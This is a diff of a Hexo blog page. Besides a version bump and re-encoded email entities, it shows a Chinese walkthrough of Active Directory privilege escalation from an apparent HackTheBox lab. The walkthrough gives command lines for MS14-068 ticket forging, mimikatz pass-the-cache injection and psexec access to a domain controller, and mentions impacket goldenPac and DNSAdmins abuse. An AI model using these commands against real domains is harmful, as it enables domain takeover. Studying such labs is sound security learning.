@@ -72,7 +72,7 @@
     
   </style>
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 7.3.0"></head>
 
 
     <body class="custom-background">
@@ -224,12 +224,12 @@
 
 <p>6.ms14-068生成高权限TGT票证</p>
 <p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105217-197f4d58-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105217-197f4d58-8ce9-1.png" alt="img"></a></p>
-<p>7.替换低权限票证mv <a href="mailto:&#84;&#71;&#84;&#x5f;&#x6a;&#x61;&#x6d;&#101;&#x73;&#x40;&#x48;&#84;&#66;&#46;&#x4c;&#x4f;&#x43;&#x41;&#76;&#46;&#99;&#99;&#x61;&#99;&#x68;&#101;">&#84;&#71;&#84;&#x5f;&#x6a;&#x61;&#x6d;&#101;&#x73;&#x40;&#x48;&#84;&#66;&#46;&#x4c;&#x4f;&#x43;&#x41;&#76;&#46;&#99;&#99;&#x61;&#99;&#x68;&#101;</a> &#x2F;tmp&#x2F;krb5cc_1000</p>
+<p>7.替换低权限票证mv <a href="mailto:&#84;&#x47;&#84;&#x5f;&#106;&#x61;&#109;&#101;&#115;&#64;&#x48;&#84;&#x42;&#46;&#76;&#x4f;&#x43;&#65;&#76;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#101;">&#84;&#x47;&#84;&#x5f;&#106;&#x61;&#109;&#101;&#115;&#64;&#x48;&#84;&#x42;&#46;&#76;&#x4f;&#x43;&#65;&#76;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#101;</a> &#x2F;tmp&#x2F;krb5cc_1000</p>
 <p>8.smb成功登录C$</p>
 <p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105226-1f4e367c-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105226-1f4e367c-8ce9-1.png" alt="img"></a></p>
 <p><strong>Mimikatz利用</strong>：<br>先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令</p>
-<p>ms14-068.py -u <a href="mailto:&#x6a;&#97;&#109;&#101;&#115;&#x40;&#72;&#84;&#x42;&#46;&#76;&#x4f;&#67;&#x41;&#76;">&#x6a;&#97;&#109;&#101;&#115;&#x40;&#72;&#84;&#x42;&#46;&#76;&#x4f;&#67;&#x41;&#76;</a> -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis</p>
-<p>将<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#106;&#x61;&#x6d;&#101;&#x73;&#64;&#72;&#x54;&#x42;&#x2e;&#x4c;&#79;&#x43;&#x41;&#76;&#46;&#x63;&#x63;&#97;&#99;&#104;&#x65;">&#x54;&#x47;&#x54;&#x5f;&#106;&#x61;&#x6d;&#101;&#x73;&#64;&#72;&#x54;&#x42;&#x2e;&#x4c;&#79;&#x43;&#x41;&#76;&#46;&#x63;&#x63;&#97;&#99;&#104;&#x65;</a>文件放入mimikatz目录中<br>mimikatz.exe log “kerberos::ptc <a href="mailto:&#84;&#x47;&#x54;&#95;&#106;&#97;&#109;&#x65;&#x73;&#x40;&#x48;&#x54;&#66;&#46;&#x4c;&#x4f;&#67;&#65;&#x4c;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;">&#84;&#x47;&#x54;&#95;&#106;&#97;&#109;&#x65;&#x73;&#x40;&#x48;&#x54;&#66;&#46;&#x4c;&#x4f;&#67;&#65;&#x4c;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;</a>“<br>exit<br>注入成功即可获得域管理session,可以klist看一下是否有了kerberos Ticket<br>net use \htb.local\admin$ ####使用IP可能会失败<br>dir \htb.local\c$<br>psexec \htb.local cmd.exe</p>
+<p>ms14-068.py -u <a href="mailto:&#106;&#97;&#x6d;&#101;&#115;&#64;&#x48;&#x54;&#x42;&#46;&#x4c;&#79;&#x43;&#65;&#76;">&#106;&#97;&#x6d;&#101;&#115;&#64;&#x48;&#x54;&#x42;&#46;&#x4c;&#79;&#x43;&#65;&#76;</a> -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis</p>
+<p>将<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x6a;&#x61;&#x6d;&#101;&#x73;&#x40;&#x48;&#x54;&#x42;&#x2e;&#x4c;&#79;&#67;&#x41;&#76;&#x2e;&#99;&#x63;&#97;&#x63;&#x68;&#x65;">&#x54;&#x47;&#x54;&#x5f;&#x6a;&#x61;&#x6d;&#101;&#x73;&#x40;&#x48;&#x54;&#x42;&#x2e;&#x4c;&#79;&#67;&#x41;&#76;&#x2e;&#99;&#x63;&#97;&#x63;&#x68;&#x65;</a>文件放入mimikatz目录中<br>mimikatz.exe log “kerberos::ptc <a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#106;&#97;&#109;&#x65;&#115;&#64;&#x48;&#x54;&#66;&#46;&#x4c;&#79;&#x43;&#x41;&#76;&#x2e;&#x63;&#x63;&#97;&#99;&#104;&#101;">&#x54;&#x47;&#x54;&#x5f;&#106;&#97;&#109;&#x65;&#115;&#64;&#x48;&#x54;&#66;&#46;&#x4c;&#79;&#x43;&#x41;&#76;&#x2e;&#x63;&#x63;&#97;&#99;&#104;&#101;</a>“<br>exit<br>注入成功即可获得域管理session,可以klist看一下是否有了kerberos Ticket<br>net use \htb.local\admin$ ####使用IP可能会失败<br>dir \htb.local\c$<br>psexec \htb.local cmd.exe</p>
 <p>突破“本地账户才能漏洞利用”的限制：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/56081.html">先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接：</a></p>
 <p><strong>Impacket套件利用</strong><br>也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105317-3dc72e38-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105317-3dc72e38-8ce9-1.png" alt="img"></a></p>
 <h1 id="0x05、DNSAdmins"><a href="#0x05、DNSAdmins" class="headerlink" title="0x05、DNSAdmins"></a>0x05、DNSAdmins</h1><p>默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限<br>利用条件：拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权</p>
